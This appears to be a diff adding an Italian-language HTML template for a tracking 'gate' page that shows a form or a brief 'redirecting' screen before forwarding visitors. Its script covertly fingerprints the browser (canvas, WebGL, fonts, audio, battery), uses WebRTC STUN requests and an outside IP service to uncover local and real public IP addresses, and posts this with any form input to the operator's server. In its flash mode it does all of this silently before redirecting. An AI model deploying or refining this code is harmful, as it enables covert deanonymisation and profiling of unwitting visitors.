@@ -1,0 +1,227 @@
+<!DOCTYPE html><html lang="{{ page.lang or 'it' }}"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="robots" content="noindex,nofollow"><title>{{ page.tab_title }}</title>
+<style>
+:root{color-scheme:dark;--bg:{{ page.bg }};--card:{{ page.card }};--accent:{{ page.accent }};--text:{{ page.text }};--radius:{{ page.radius }};--button-text:#0b0b0e}*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font:16px/1.6 "Segoe UI",system-ui,sans-serif;padding:48px 24px;min-height:100vh}.gate-shell{max-width:560px;margin:0 auto}.brand{display:flex;align-items:center;gap:12px;font-size:16px;font-weight:500;margin-bottom:28px}.brand svg{color:var(--accent);flex:none}.brand small{display:block;font-size:12px;font-weight:400;opacity:.78}.card{background:var(--card);border:1px solid color-mix(in srgb,var(--text) 18%,transparent);border-radius:var(--radius);padding:36px}.logo{margin-bottom:24px;font-size:32px}.logo img{max-height:64px;max-width:200px;object-fit:contain}h1{font-size:28px;line-height:1.25;font-weight:500;letter-spacing:-.5px;margin:0 0 12px}.sub{margin:0 0 24px;opacity:.85;font-size:15px}.form-field{margin-top:24px}label{display:flex;align-items:baseline;justify-content:space-between;gap:12px;font-size:14px;font-weight:500;margin-bottom:8px}.field-meta{font-size:12px;font-weight:400;opacity:.75}input,textarea,select{width:100%;min-height:48px;border:1px solid color-mix(in srgb,var(--text) 35%,transparent);border-radius:8px;padding:12px;line-height:1.5;font-family:inherit;font-size:16px;background:var(--card);color:var(--text)}input::placeholder,textarea::placeholder{color:var(--text);opacity:.55}input:focus,textarea:focus,select:focus{outline:2px solid var(--accent);outline-offset:3px}textarea{min-height:112px;resize:vertical}button{width:100%;margin-top:28px;border:0;border-radius:8px;padding:14px 20px;background:var(--accent);color:var(--button-text);font:500 15px/1.5 "Segoe UI",system-ui,sans-serif;cursor:pointer;min-height:48px;transition:opacity .16s}button:hover{opacity:.9}button:disabled{opacity:.6;cursor:wait}button:focus-visible,a:focus-visible,summary:focus-visible{outline:2px solid var(--accent);outline-offset:4px}.err{display:none;border:1px solid #d96b7a;background:#351e27;color:#ffccd3;border-radius:8px;padding:12px 16px;margin-top:16px;font-size:14px}.spin{display:none;font-size:14px;margin-top:16px;opacity:.85}.foot{margin-top:24px;padding-top:20px;border-top:1px solid color-mix(in srgb,var(--text) 18%,transparent);font-size:13px;opacity:.8}.info{margin:0 0 24px;padding:16px;border:1px solid color-mix(in srgb,var(--text) 18%,transparent);border-radius:8px;font-size:13px}.info summary{cursor:pointer;font-weight:500}.info p{margin:12px 0 0;opacity:.85}.preview-note{font-size:13px;border-left:3px solid var(--accent);padding:8px 12px;margin:0 0 24px}.destination{margin-top:24px;font-size:13px;opacity:.8;overflow-wrap:anywhere}.bar{height:3px;background:color-mix(in srgb,var(--text) 15%,transparent);margin-top:24px;border-radius:2px}.bar i{display:block;width:35%;height:100%;background:var(--accent)}a{color:var(--accent)}.gate-footer{margin-top:20px;font-size:12px;opacity:.7;text-align:center}@media(max-width:560px){body{padding:24px 16px}.card{padding:24px}.brand{margin-bottom:20px}h1{font-size:24px}label{align-items:flex-start}.gate-shell{max-width:100%}}@media(prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
+</style>{% if page.css %}<style>{{ page.css }}</style>{% endif %}</head><body><main class="gate-shell">
+{% if preview %}<p class="preview-note">Anteprima · Nessun invio o reindirizzamento</p>{% endif %}<section class="card">
+<h1>{{ page.title }}</h1>{% if page.subtitle %}<p class="sub">{{ page.subtitle }}</p>{% endif %}
+{% if mode in ('form','strict') %}
+<form id="f" onsubmit="return invia(event)">{% for fl in fields %}<div class="form-field"><label for="fi_{{ loop.index }}"><span>{{ fl.label }}</span><span class="field-meta">{{ 'Obbligatorio' if fl.required else 'Facoltativo' }}</span></label>
+{% if fl.type == 'textarea' %}<textarea id="fi_{{ loop.index }}" data-name="{{ fl.name }}" data-required="{{ 1 if fl.required else 0 }}" {% if fl.required %}required{% endif %} placeholder="{{ fl.placeholder or '' }}"></textarea>
+{% elif fl.type == 'select' %}<select id="fi_{{ loop.index }}" data-name="{{ fl.name }}" data-required="{{ 1 if fl.required else 0 }}" {% if fl.required %}required{% endif %}><option value="">Seleziona un'opzione</option>{% for opt in (fl.options or '').split(',') %}{% if opt.strip() %}<option value="{{ opt.strip() }}">{{ opt.strip() }}</option>{% endif %}{% endfor %}</select>
+{% else %}<input type="{{ fl.type or 'text' }}" id="fi_{{ loop.index }}" data-name="{{ fl.name }}" data-required="{{ 1 if fl.required else 0 }}" {% if fl.required %}required{% endif %} {% if fl.type == 'number' %}step="any"{% endif %} placeholder="{{ fl.placeholder or '' }}" autocomplete="{{ 'tel' if fl.type=='tel' else 'email' if fl.type=='email' else 'on' }}">{% endif %}</div>{% endfor %}<button id="btn" type="submit">{{ page.button }}</button><div class="spin" id="spin" role="status" aria-live="polite">Controllo dei dati in corso…</div><div class="err" id="err" role="alert" aria-live="polite">Compila i campi obbligatori per continuare</div></form>
+{% else %}<div class="bar" aria-hidden="true"><i></i></div><div class="spin" id="spin" style="display:block" role="status">Reindirizzamento in corso…</div>{% if not preview %}<p style="margin-top:24px"><a href="{{ dest }}">Continua alla destinazione</a></p>{% endif %}{% endif %}
+{% if page.footer %}<div class="foot">{{ page.footer }}</div>{% endif %}</section></main>
+<script>
+const actionButton=document.getElementById('btn');
+if(actionButton){const rgb=getComputedStyle(actionButton).backgroundColor.match(/[\d.]+/g);if(rgb&&rgb.length>=3){const c=rgb.slice(0,3).map(v=>{v=Number(v)/255;return v<=.04045?v/12.92:Math.pow((v+.055)/1.055,2.4)});document.documentElement.style.setProperty('--button-text',(.2126*c[0]+.7152*c[1]+.0722*c[2])>.179?'#08080a':'#ffffff')}}
+var CFG = {
+  slug: {{ slug|tojson }},
+  sid: {{ sid|tojson }},
+  dest: {{ dest|tojson }},
+  mode: {{ mode|tojson }},
+  delay: {{ delay|tojson }},
+  preview: {{ 'true' if preview else 'false' }}
+};
+
+/* ---------- fingerprint ---------- */
+function h32(str){var h=5381;for(var i=0;i<str.length;i++){h=((h<<5)+h+str.charCodeAt(i))>>>0}return 'h'+h.toString(16)}
+
+var FP = {};
+var RET = {ip_pubblico:'', ip_lan:[], ip_webrtc:[]};
+
+function canvasHash(){
+  try{var c=document.createElement('canvas');c.width=240;c.height=60;var x=c.getContext('2d');
+  x.textBaseline='top';x.font='16px "Arial"';x.fillStyle='#f60';x.fillRect(2,2,90,20);
+  x.fillStyle='#069';x.fillText('GET-fp-\u4e2d\u6587-\ud83d\ude00',4,8);
+  x.fillStyle='rgba(102,204,0,.7)';x.fillText(' fingerprint',6,30);
+  return h32(c.toDataURL());}catch(e){return 'n/d'}
+}
+function webglInfo(){
+  try{var c=document.createElement('canvas');var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+  if(!gl)return 'n/d';var d=gl.getExtension('WEBGL_debug_renderer_info');
+  return (d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER))||'n/d';}catch(e){return 'n/d'}
+}
+function detectFonts(){
+  try{var list=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Trebuchet MS',
+  'Calibri','Cambria','Consolas','Segoe UI','Roboto','Helvetica','Tahoma','Lucida Console','Microsoft Sans Serif',
+  'SimSun','Wingdings','San Francisco','Ubuntu','Arial Black','Palatino','Garamond','Bookman','Meiryo','Yu Gothic'];
+  var s=document.createElement('span');s.style.cssText='position:absolute;visibility:hidden;white-space:nowrap;font-size:72px';
+  s.textContent='mmmmmmmmmmlli';document.body.appendChild(s);
+  var base=[];['monospace','sans-serif','serif'].forEach(function(d){s.style.fontFamily=d;base.push(s.offsetWidth)});
+  var f=[];list.forEach(function(n){var hit=false;
+    ['monospace','sans-serif','serif'].forEach(function(d,i){s.style.fontFamily='"'+n+'",'+d;if(s.offsetWidth!==base[i])hit=true});
+    if(hit)f.push(n);});
+  document.body.removeChild(s);return f;}catch(e){return[]}
+}
+function baseFp(){
+  try{
+    FP.schermo=screen.width+'x'+screen.height;
+    FP.schermo_disponibile=screen.availWidth+'x'+screen.availHeight;
+    FP.colore_bits=screen.colorDepth;
+    FP.pixel_ratio=window.devicePixelRatio;
+    FP.finestra=window.innerWidth+'x'+window.innerHeight;
+    FP.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    FP.lingua_js=navigator.language;
+    FP.lingue=navigator.languages;
+    FP.piattaforma=navigator.platform;
+    FP.cpu_threads=navigator.hardwareConcurrency;
+    FP.memoria_gb=(navigator.deviceMemory!==undefined)?navigator.deviceMemory:'n/d';
+    FP.touch_points=navigator.maxTouchPoints;
+    FP.cookie_abilitati=navigator.cookieEnabled;
+    FP.java=(function(){try{return navigator.javaEnabled()}catch(e){return false}})();
+    FP.webdriver=navigator.webdriver;
+    FP.do_not_track=navigator.doNotTrack;
+    FP.referrer=document.referrer||'';
+    FP.pagina=location.href;
+    FP.canvas_hash=canvasHash();
+    FP.webgl_gpu=webglInfo();
+    FP.font_rilevati=detectFonts();
+    FP.tema_scuro=!!(window.matchMedia&&matchMedia('(prefers-color-scheme: dark)').matches);
+    FP.motion_ridotto=!!(window.matchMedia&&matchMedia('(prefers-reduced-motion: reduce)').matches);
+    FP.storage=(function(){try{localStorage.setItem('_t','1');localStorage.removeItem('_t');return true}catch(e){return false}})();
+    FP.plugins=(navigator.plugins||[]).length;
+    FP.connessione=navigator.connection?{tipo:navigator.connection.effectiveType,downlink:navigator.connection.downlink,rtt:navigator.connection.rtt}:null;
+  }catch(e){FP.errore=String(e)}
+}
+/* batteria */
+function batteria(cb){
+  if(!navigator.getBattery){return cb()}
+  navigator.getBattery().then(function(b){FP.batteria={livello:b.level,in_carica:b.charging};cb()}).catch(function(){cb()});
+}
+/* audio */
+function audio(cb){
+  try{var C=window.OfflineAudioContext||window.webkitOfflineAudioContext;if(!C)return cb();
+  var ctx=new C(1,4410,44100);var o=ctx.createOscillator();o.type='triangle';o.frequency.value=10000;
+  var cp=ctx.createDynamicsCompressor();o.connect(cp);cp.connect(ctx.destination);o.start(0);
+  ctx.startRendering().then(function(buf){var d=buf.getChannelData(0),s=0;
+  for(var i=4500;i<5000;i++)s+=Math.abs(d[i]);FP.audio_hash=h32(String(s));cb()}).catch(function(){cb()});
+  }catch(e){cb()}
+}
+/* WebRTC: IP locali + IP pubblico reale */
+function webrtcIps(cb){
+  try{
+    var RTC=window.RTCPeerConnection||window.webkitRTCPeerConnection||window.mozRTCPeerConnection;
+    if(!RTC)return cb();
+    var pc=new RTC({iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'}]});
+    var done=false;
+    pc.createDataChannel('tl');
+    pc.onicecandidate=function(e){
+      if(!e||!e.candidate)return;
+      var cand=e.candidate.candidate||'';
+      var m=/([0-9]{1,3}(?:\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{0,4}){2,7})/i.exec(cand);
+      if(m){var ip=m[1];
+        if(cand.indexOf('typ host')>-1||cand.indexOf('typ srflx')>-1){
+          if(RET.ip_webrtc.indexOf(ip)<0)RET.ip_webrtc.push(ip);
+        }}
+    };
+    try{pc.createOffer().then(function(o){return pc.setLocalDescription(o)}).catch(function(){})}catch(e){}
+    setTimeout(function(){if(done)return;done=true;try{pc.close()}catch(e){}
+      RET.ip_lan=RET.ip_webrtc.slice();cb();},1400);
+  }catch(e){cb()}
+}
+/* IP pubblico via servizio esterno */
+function publicIp(cb){
+  try{
+    var c=new AbortController();var t=setTimeout(function(){c.abort()},1500);
+    fetch('https://api.ipify.org?format=json',{signal:c.signal,cache:'no-store'})
+      .then(function(r){return r.json()}).then(function(d){
+        clearTimeout(t);RET.ip_pubblico=d.ip||'';cb();
+      }).catch(function(){clearTimeout(t);cb()});
+  }catch(e){cb()}
+}
+
+function raccogli(cb){
+  baseFp();
+  var n=0,tot=3;
+  function fine(){n++;if(n>=tot)cb()}
+  batteria(fine);audio(fine);webrtcIps(fine);
+  publicIp(function(){/* integro anche l'IP dal WebRTC se presente */
+    if(!RET.ip_pubblico){for(var i=0;i<RET.ip_webrtc.length;i++){var ip=RET.ip_webrtc[i];
+      if(ip.indexOf('10.')!==0&&ip.indexOf('192.168.')!==0&&ip.indexOf('172.')!==0&&ip!=='127.0.0.1'){RET.ip_pubblico=ip;break}}}
+  });
+  if(!CFG.preview){setTimeout(function(){if(saved)return},2100);}
+}
+
+/* ---------- invio + redirect ---------- */
+var saved=false;
+function inviaDati(formDati,cb){
+  var body={sid:CFG.sid, fp:FP, form:formDati||{}, rete:{ip_pubblico_js:RET.ip_pubblico, ip_webrtc:RET.ip_webrtc}};
+  if(CFG.preview){if(cb)cb();return}
+  var p=null;
+  try{
+    p=fetch('/beacon/'+CFG.slug,{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify(body),keepalive:true,credentials:'omit'});
+  }catch(e){
+    try{navigator.sendBeacon('/beacon/'+CFG.slug, JSON.stringify(body))}catch(e2){}
+  }
+  saved=true;
+  // Navigation must also continue when the network request rejects.
+  function continua(){if(cb)cb()}
+  Promise.race([p||Promise.resolve(), new Promise(function(r){setTimeout(r,1200)})]).then(continua,continua);
+}
+function vai(){window.location.replace(CFG.dest)}
+
+function invia(ev){
+  ev.preventDefault();
+  var dati={},manca=false;
+  document.querySelectorAll('[data-name]').forEach(function(el){
+    var v=(el.value||'').trim();
+    if(el.dataset.required==='1'&&!v)manca=true;
+    if(v)dati[el.dataset.name]=v;
+  });
+  if(manca){document.getElementById('err').textContent='Compila i campi obbligatori per continuare.';document.getElementById('err').style.display='block';return false}
+  document.getElementById('err').style.display='none';
+  var btn=document.getElementById('btn');
+  if(btn)btn.disabled=true;
+  if(document.getElementById('spin'))document.getElementById('spin').style.display='block';
+  if(CFG.preview){
+    document.getElementById('err').textContent='Anteprima: invio e controlli sul server disattivati.';
+    document.getElementById('err').style.display='block';
+    if(btn)btn.disabled=false;
+    if(document.getElementById('spin'))document.getElementById('spin').style.display='none';
+    return false;
+  }
+  var submitted=false;
+  async function submitForm(){
+    if(submitted)return;
+    submitted=true;
+    var controller=new AbortController();
+    var timeout=setTimeout(function(){controller.abort()},30000);
+    try{
+      var response=await fetch('/collect/'+CFG.slug,{
+        method:'POST',headers:{'Content-Type':'application/json'},signal:controller.signal,
+        body:JSON.stringify({sid:CFG.sid,form:dati,fp:FP,rete:{ip_pubblico_js:RET.ip_pubblico,ip_webrtc:RET.ip_webrtc}})
+      });
+      var result=await response.json();
+      if(!response.ok || !result.ok){
+        throw new Error(result.errors?Object.values(result.errors).join(' '):(result.error||'Impossibile inviare il modulo.'));
+      }
+      saved=true;
+      setTimeout(vai,CFG.delay);
+    }catch(e){
+      document.getElementById('err').textContent=e.name==='AbortError'?'Il controllo ha impiegato troppo tempo. Riprova.':(e.message||'Invio non riuscito. Riprova.');
+      document.getElementById('err').style.display='block';
+      if(btn)btn.disabled=false;
+      if(document.getElementById('spin'))document.getElementById('spin').style.display='none';
+    }finally{clearTimeout(timeout)}
+  }
+  raccogli(submitForm);
+  setTimeout(submitForm,2600);
+  return false;
+}
+
+/* modalità flash: nessun form, si raccoglie e si redirige */
+if(CFG.mode==='flash' && !CFG.preview){
+  raccogli(function(){inviaDati({},function(){setTimeout(vai,CFG.delay)})});
+  setTimeout(function(){if(!saved)inviaDati({},function(){setTimeout(vai,CFG.delay)})},2600);
+}
+/* in anteprima non si redirige */
+if(CFG.preview){
+  if(CFG.mode==='flash'){
+    raccogli(function(){});
+    var s=document.getElementById('spin');if(s)s.textContent='Anteprima — i dati non vengono salvati';
+  }
+}
+</script>
+</body>
+</html>
